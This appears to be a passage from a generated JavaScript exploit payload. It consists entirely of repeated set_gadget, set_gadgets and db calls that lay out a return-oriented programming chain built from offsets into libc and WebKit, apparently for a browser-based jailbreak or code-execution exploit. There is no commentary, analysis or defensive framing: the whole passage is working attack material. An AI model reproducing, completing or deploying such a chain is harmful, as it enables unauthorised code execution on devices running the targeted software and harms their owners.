db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+134704, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+134808, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+134840, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+134824, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+134912, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+134928, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+135024, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+135008, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+135104, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([10, 0]); 
set_gadget(libc_base+788575,); 
db([10, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+135256, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+135272, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+135240, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+135440, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+135456, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+135424, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+135592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+135608, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+135576, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+135680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+793877, 
ropchain+135800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+135816, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+135784, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+135952, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+135968, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+135936, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+136040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+793877, 
ropchain+136160, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+136176, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+136144, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+136280, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+136328, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+136312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+136440, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+136432, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+136456, 
ropchain+138752, 
libc_base+793877, 
ropchain+136512, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+136600, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+136616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+136768, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+136800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+136752, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+136784, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+136872, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+136888, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+137048, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+137016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+137000, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+137152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+137136, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+137248, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+137336, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+137352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+137424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+137440, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+137584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+137552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+137568, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+137672, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+137776, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+137864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+137880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+137984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+137968, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+138040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+138160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+138216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+138360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+138328, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+138488, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+138504, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+138472, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+138600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+138616, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+138728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+138712, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+811575, 
ropchain+140160, 
libc_base+793877, 
ropchain+138808, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+138896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+138912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+139056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+139024, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+139040, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+139152, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+139240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+139256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+139408, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+139440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+139392, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+139424, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+139536, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+139520, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+139640, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+140472, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+139776, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+139792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+139760, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+139912, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+139928, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+139896, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+140024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+140040, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+140152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+140136, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+140240, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+140224, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+140336, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+140352, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+140464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+140448, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
__swbuf_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+141792, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+141864, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+141976, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+141992, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+142080, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+142096, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+142216, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+142232, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+142200, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+142328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+142344, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+142456, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+142440, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+142544, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+142528, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+142640, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+142656, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+142768, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+142752, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+142840, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+142952, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+142968, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+143056, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+143072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+143224, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+143256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+143208, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+143240, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+143416, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+143384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+143368, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+143544, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+143560, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+143528, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+143656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+143672, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+143784, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+143768, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+143872, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+143856, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+143968, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+143984, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+144096, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+144080, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+144168, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+144280, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+144296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+144384, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+144400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+144560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+144528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+144512, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
